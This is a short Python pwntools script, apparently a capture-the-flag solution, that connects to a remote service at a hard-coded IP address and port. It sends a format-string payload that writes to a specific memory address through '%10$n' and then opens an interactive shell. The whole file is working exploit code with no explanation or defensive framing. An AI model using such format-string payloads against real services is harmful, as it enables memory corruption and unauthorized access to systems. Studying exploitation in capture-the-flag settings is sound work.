from pwn import * 
sh = remote('111.198.29.45',36640)
sh.recv()
sh.sendline('hacker')
sh.recv()
payload = p32(0x804a068) +'aaaa' +'%10$n'
sh.sendline(payload)
sh.interactive()
